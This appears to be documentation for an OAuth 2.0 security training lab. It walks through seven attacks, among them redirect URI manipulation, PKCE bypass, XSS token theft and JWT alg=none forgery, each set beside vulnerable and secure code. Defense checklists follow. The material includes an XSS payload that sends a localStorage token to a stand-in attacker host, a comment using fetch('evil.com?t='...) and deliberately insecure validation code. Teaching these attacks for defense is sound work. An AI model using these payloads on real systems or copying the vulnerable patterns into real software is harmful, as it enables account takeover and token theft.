01
Redirect URI Manipulation
Weak URI validation lets an attacker steal the authorization code by redirecting it to their server. This exact pattern was exploited in CVE-2014-8671 (Facebook) and countless SSO misconfigurations.
HIGH auth-server/src/routes/auth.js → validateRedirectUri()

How This Attack Works

When a user clicks Login, the client sends a redirect_uri parameter telling the auth server where to send the authorization code after login. The auth server must validate this URI exactly against a pre-registered list.

Vulnerable servers use prefix or substring matching: if the requested URI starts with a registered value, it passes. An attacker registers or crafts a domain that starts with the same prefix — e.g. http://client:3002.evil.com/steal — which passes the check and receives the code.

⚠️In VULNERABLE mode: requested.startsWith(registered.replace('/callback','')) — the attacker's domain passes because it shares the same hostname prefix.

Vulnerable vs Secure Code

🔴 VULNERABLE — auth-server/src/routes/auth.js

🟢 SECURE — exact match only (RFC 6749 §3.1.2)
// Exact string equality — nothing else accepted return registered.includes(requested); // Only "http://client:3002/callback" passes ✅

02
Authorization Code Interception (PKCE Bypass)
Without PKCE, any attacker who obtains an authorization code can exchange it for tokens. PKCE cryptographically binds the code to the specific client that requested it using a one-time verifier.
HIGHauth-server/src/routes/token.js → handleAuthCodeGrant()

How This Attack Works

PKCE adds a layer: before authorization, the client generates a random code_verifier and computes SHA256(code_verifier) as the code_challenge. Only the challenge is sent to the auth server. When exchanging the code, the client must present the original verifier. The server recomputes the hash and compares.

An attacker who intercepts the authorization code (via Attack 1, proxy logs, browser history, or referrer headers) cannot complete the exchange without knowing the verifier — which never leaves the legitimate client. In VULNERABLE mode the check is skipped entirely.

⚠️Without PKCE an authorization code is effectively a bearer token. Whoever presents it first gets the access tokens. The code is visible in browser history, proxy logs, and referrer headers.

Step-by-Step Execution

  1. 1

    Capture an authorization code using Attack 1's malicious redirect URL. The code appears in the Attacker Dashboard under "Captured Codes".

  2. 2

    Exchange the code without a code_verifier. In VULNERABLE mode the server accepts this. Replace STOLEN_CODE with the captured value.

    curl — exchange without code_verifier
    …
  3. 3

    VULNERABLE: Server returns access_token and refresh_token — attacker has full account access.
    SECURE: Server returns {"error":"invalid_grant"} — PKCE verification fails.

PKCE Flow Explained

PKCE — cryptographic binding
Client generates before authorization:
  code_verifier  = crypto.randomBytes(32).toString('base64url')
  code_challenge = BASE64URL(SHA256(code_verifier))

GET /oauth/authorize?…&code_challenge=CHALLENGE&code_challenge_method=S256
  → Auth server stores: { code: "xyz", challenge: CHALLENGE }

POST /token { code: "xyz", code_verifier: VERIFIER }
  → SHA256(VERIFIER) === CHALLENGE  → tokens issued ✅
  → Attacker has "xyz", no VERIFIER → 400 invalid_grant ❌

Vulnerable vs Secure Code

🔴 VULNERABLE — token.js
if (VULNERABLE) { console.warn('⚠️ [VULNERABLE] Skipping PKCE verification'); // Falls through — code accepted without any verifier check }
🟢 SECURE
const expected = crypto.createHash('sha256') .update(code_verifier).digest('base64url'); if (authCode.code_challenge !== expected) { return res.status(400).json({ error: 'invalid_grant', error_description: 'PKCE code_verifier mismatch' }); }

03
Token Leakage via XSS
Access tokens stored in localStorage are accessible to every JavaScript context on the origin — including attacker-injected scripts. One XSS payload silently exfiltrates the full JWT to the attacker's server.
HIGHclient-app/src/server.js → /callback

How This Attack Works

localStorage has no JavaScript isolation — any script running on the origin can call localStorage.getItem('access_token') and read the full JWT. This includes injected XSS payloads, malicious third-party libraries, or compromised CDN scripts.

An HttpOnly cookie is the correct storage mechanism. The browser includes it in requests automatically, but document.cookie never returns it. Even a fully successful XSS attack cannot read the token.

  2. 2

  3. 3

    Visit the XSS demo — a simulated payload fires automatically, reads the token, and sends it to the attacker server.

    XSS Demo Page
    …
  4. 4

    Open the Attacker Dashboard — the stolen token appears under "Captured Tokens via XSS".

  5. 5

    Use the stolen token against the Resource API directly:

    curl — use stolen token
    …
⚠️The XSS payload (simplified):
const t=localStorage.getItem('access_token'); fetch('ATTACKER/capture?token='+encodeURIComponent(t));
Executes silently, zero UI indication.

Vulnerable vs Secure Code

🔴 VULNERABLE — token in localStorage
localStorage.setItem('access_token', accessToken); localStorage.setItem('refresh_token', refreshToken); // XSS: fetch('evil.com?t=' + localStorage.getItem('access_token'))
🟢 SECURE — HttpOnly cookie
res.cookie('access_token', accessToken, { httpOnly: true, // document.cookie never returns this ✅ secure: true, // HTTPS only sameSite: 'Strict', // CSRF protection maxAge: 3600000, });

OAuth Consent Abuse
A malicious OAuth client uses a phishing page to trick users into granting admin permissions. In VULNERABLE mode there is no admin approval gate — any registered client can request any scope and receive it.
HIGHauth-server/src/routes/auth.js → privileged scope check

How This Attack Works

OAuth clients should only be permitted to request scopes that an administrator has pre-approved for them. Without this gate, an attacker creates a convincing phishing page that initiates a real OAuth flow as malicious-client requesting admin and write scopes.

The user sees what looks like a legitimate consent screen. When they approve, the attacker receives an authorization code exchangeable for admin-scoped tokens.

05
Refresh Token Abuse
Refresh tokens that never expire and never rotate give an attacker who steals one permanent, unlimited access — even after the victim changes their password.
CRITICALauth-server/src/routes/token.js → handleRefreshTokenGrant()

How This Attack Works

Refresh tokens are long-lived credentials used to obtain new access tokens after the short-lived access token expires. In VULNERABLE mode they have a 10-year expiry and are never rotated — the same token works indefinitely.

With refresh token rotation, every use revokes the old token and issues a new one. If an attacker later tries to use a stolen refresh token that the legitimate client has already consumed, the server detects reuse and revokes the entire token family, forcing re-authentication.

Step-by-Step Execution

  1. 1

    Log in and complete the OAuth flow. Open DevTools → Application → Local Storage. Copy the refresh_token value.

  2. 2

    Use the stolen refresh token to get a new access token:

    curl — use stolen refresh token
    …
  3. 3

    Run the command 5 more times. In VULNERABLE mode the same token works every single time — no rotation, no expiry, no detection.

  4. 4

    Inspect the refresh token state to confirm zero rotations:

    Auth Server — refresh token state
    …

Vulnerable vs Secure Code

🔴 VULNERABLE — 10-year expiry, no rotation
const expiryDays = VULNERABLE ? 3650 : 30; // 10 years in vulnerable mode // Same token returned every time — attacker's copy never invalidated return res.json({ access_token, refresh_token: existingToken });
🟢 SECURE — rotate on every use

Scope Escalation
The auth server grants whatever scopes are requested, ignoring what the client is registered for. Adding admin write to the authorization request is all it takes to gain elevated access.
HIGHauth-server/src/routes/auth.js → validateScopes()

How This Attack Works

legitimate-client is registered for read, profile, email. In VULNERABLE mode the auth server grants whatever scopes are requested — not what the client registered. An attacker simply appends admin write to the scope parameter.

The resulting access token's scope claim will contain admin write even though the client was never authorized for them. The Resource API trusts the JWT scope claim, granting admin access.

  1. 1

    Log in as alice / password123 and approve. The callback completes and the client exchanges the code for a token.

  3. 3

    Decode your access token at jwt.io. The scope claim in the payload contains admin write — escalation confirmed.

  4. 4

    Call the admin endpoint with the escalated token:

    curl — admin endpoint with escalated token
    …

Vulnerable vs Secure Code

🔴 VULNERABLE — returns all requested scopes
return requested; // ['read','profile','email','admin','write'] // legitimate-client asked for admin → granted ✗
🟢 SECURE — intersection of requested ∩ registered
return requested.filter(s => registered.includes(s)); // registered: ['read','profile','email'] // requested: ['read','profile','email','admin','write'] // granted: ['read','profile','email'] ← admin stripped ✅

07
JWT Algorithm Confusion (alg=none)
CVE-2015-9235 — The resource server uses jwt.decode() instead of jwt.verify(), skipping all signature checks. Forged tokens with any payload — including admin roles — are accepted as valid.
CRITICALresource-server/src/server.js → requireAuth() middleware

How This Attack Works

jwt.decode() only Base64-decodes the header and payload without verifying the signature. An attacker crafts a token with elevated claims (admin roles, any user ID, any scope), sets alg: "none", and appends an empty signature. The server reads the payload and grants the described access.

The fix is trivial: replace jwt.decode() with jwt.verify() and specify an explicit algorithm whitelist. This rejects alg=none, RS256 substitution attacks, and every other algorithm confusion variant.

🔑Rule: Never use jwt.decode() for authentication decisions. It only Base64-decodes — it does not verify. Always use jwt.verify() with algorithms: ['HS256'] (or RS256 in production).

Step-by-Step Execution

  1. 1

    Open the JWT Forge Tool — it generates a pre-built forged token with admin scope and an empty signature.

    JWT Forge Tool
    …
  2. 2

    Copy the forged token. Test it against the profile endpoint:

    curl — forged token vs /api/profile
    …
  3. 3

    Test against the admin endpoint — no valid signature, but admin access granted:

    curl — forged token vs /api/admin/users
    …
  4. 4

    Craft a forged token yourself in the browser console (no tools needed):

    JavaScript — build alg=none token in console
    …

Vulnerable vs Secure Code

🔴 VULNERABLE — resource-server/src/server.js
decoded = jwt.decode(token); // Zero signature verification — alg=none accepted // Forged payloads accepted — tampered claims accepted ✗
🟢 SECURE — algorithm whitelist + full verification
decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'], // alg=none → rejected immediately ✅ issuer: AUTH_SERVER_URL, // iss claim validated ✅ audience: RESOURCE_URL, // aud claim validated ✅ }); // Invalid signature → JsonWebTokenError → 401 Unauthorized

OAuth 2.0 Architecture

How the Authorization Code Flow works across the five lab services — with PKCE, JWT token structure, and refresh token rotation.

Authorization Code Flow

StepDirectionWhat Happens
1User → BrowserClick Login on the Client App
2Browser → Auth ServerGET /oauth/authorize with client_id, redirect_uri, scope, state, code_challenge
3Auth Server → BrowserRender login and consent screen
4User → Auth ServerSubmit credentials, approve scopes
5Auth Server → Browser302 redirect to redirect_uri?code=AUTH_CODE&state=…
6Client App → Auth ServerPOST /oauth/token: code, code_verifier, client_secret
7Auth Server → Client{access_token, refresh_token, expires_in}
8Client → Resource APIGET /api/profile with Authorization: Bearer {access_token}
9Resource APIVerify JWT signature + algorithm + iss + aud + scopes → return data

JWT Access Token Structure

JWT structure
// Header (Base64URL-encoded)
{ "alg": "HS256", "typ": "JWT" }

// Payload (Base64URL-encoded)
{
  "jti": "unique-token-id",
  "sub": "user-id",
  "username": "alice",
  "client_id": "legitimate-client",
  "scope": "read profile email",
  "roles": ["user"],
  "iss": "http://AUTH_SERVER:3001",
  "aud": "http://RESOURCE_SERVER:3003",
  "exp": 1234567890,   // iat + 3600 seconds
  "iat": 1234564290
}

// Signature = HMACSHA256(base64url(header) + "." + base64url(payload), secret)
// Final token = base64url(header) + "." + base64url(payload) + "." + base64url(sig)

PKCE Flow

PKCE — binding code to client
Client generates before authorization:
  code_verifier  = crypto.randomBytes(32).toString('base64url')
  code_challenge = BASE64URL(SHA256(code_verifier))

GET /authorize?…&code_challenge=CHALLENGE&code_challenge_method=S256
  Auth server stores: { code: "xyz", challenge: CHALLENGE }

POST /token { code: "xyz", code_verifier: VERIFIER }
  Server: BASE64URL(SHA256(VERIFIER)) === CHALLENGE → tokens ✅
  Attacker has "xyz" but not VERIFIER             → 400 ❌

Refresh Token Rotation

Token rotation — preventing permanent access after theft
Login:   access_token_1  +  refresh_token_1

Client refreshes:
  Client → POST /token { refresh_token: refresh_token_1 }
  Server → revoke(refresh_token_1) → issue refresh_token_2
  Client now has: access_token_2 + refresh_token_2

Attacker uses stolen refresh_token_1 AFTER client used it:
  refresh_token_1 already revoked → 400 invalid_grant ❌

Attacker uses it BEFORE client (race):
  Server detects reuse when client tries next refresh
  → Revokes entire token family → forced re-auth ❌

Defense Strategies

Production checklists and mitigation patterns for each OAuth vulnerability in this lab.

Defense-in-Depth Layers

LayerControls
ProtocolExact redirect URI matching · PKCE required (S256) · State parameter CSRF check · Auth codes single-use, 5 min TTL
Token SecurityShort-lived access tokens (≤1h) · Refresh token rotation · JWT algorithm whitelist · HttpOnly cookies
AuthorizationScope intersection enforcement · Privileged scope admin approval · Least-privilege principle
DetectionComprehensive audit logging · Refresh token reuse detection · Anomaly alerting on monitoring dashboard

Authorization Server Checklist

  • Exact redirect URI matching — no wildcards, no prefix match, no substring match (RFC 6749 §3.1.2)
  • PKCE required (S256 method only) for all public clients — plain method is insufficient
  • State parameter validated on every callback — prevents CSRF on the authorization flow
  • Authorization codes expire in ≤ 5 minutes and are single-use only
  • Scope intersection enforced: granted = requested ∩ registered
  • Privileged scopes require explicit admin pre-approval per client
  • All auth events logged: client_id, user_id, scopes, IP, timestamp

Token Management Checklist

  • Access tokens expire in ≤ 1 hour
  • Refresh tokens expire in ≤ 30 days
  • Refresh token rotation on every use — old token revoked immediately
  • Refresh token reuse detection → revoke entire token family and alert
  • JWT verified with jwt.verify() and algorithms: ['HS256'] — never accept alg=none
  • iss and aud claims validated on every resource server request

Client Application Checklist

  • Tokens in HttpOnly, Secure, SameSite=Strict cookies — never localStorage or sessionStorage
  • PKCE implemented for every authorization request
  • State parameter: random per-request, validated on callback
  • Content Security Policy (CSP) header to limit script execution origins
  • Token never included in URLs, logs, or referrer headers

HS256 vs RS256

HS256RS256
Key typeShared secret (HMAC)RSA private/public key pair
Who verifiesAnyone with the shared secretAnyone with the public key
RecommendationDev / internal onlyProduction

Incident Response Playbook

5-step OAuth incident response
1. IDENTIFY  — Audit log: which client_id, user_id, issued_at range affected
2. CONTAIN   — Revoke all tokens for affected users/clients immediately
3. ERADICATE — Deploy secure config, rotate signing keys, patch vulnerability
4. RECOVER   — Force re-authentication, notify affected users
5. LEARN     — Update detection rules based on the observed attack pattern
